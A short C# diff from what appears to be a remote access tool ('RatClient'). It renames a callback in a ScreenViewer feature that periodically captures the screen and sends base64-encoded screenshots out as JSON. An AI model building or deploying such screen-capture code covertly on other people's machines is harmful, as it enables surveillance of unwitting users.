@@ -12,14 +12,14 @@ namespace RatClient.Features
         private System.Timers.Timer screenshotTimer;
         private bool isSendingScreenshot = false;
         private int bufferSize;
-        private Action<object> sendJson;
+        private Action<object> SendJson;
         #endregion
 
         #region Methods
-        public ScreenViewer(int bufferSize, Action<object> sendJson)
+        public ScreenViewer(int bufferSize, Action<object> SendJson)
         {
             this.bufferSize = bufferSize;
-            this.sendJson = sendJson;
+            this.SendJson = SendJson;
             
             Program.MessageReceived += HandleMessage;
         }
@@ -61,7 +61,7 @@ namespace RatClient.Features
                 screenshotTimer.Stop();
                 screenshotTimer.Dispose();
                 screenshotTimer = null;
-                sendJson(new { type = "message", text = "Stopped sending screenshots." });
+                SendJson(new { type = "message", text = "Stopped sending screenshots." });
             }
         }
 
@@ -74,7 +74,7 @@ namespace RatClient.Features
 
             var screenshot = CaptureScreen();
             string base64Screenshot = Convert.ToBase64String(screenshot);
-            sendJson(new { type = "screenshot", data = base64Screenshot });
+            SendJson(new { type = "screenshot", data = base64Screenshot });
 
             isSendingScreenshot = false;
         }
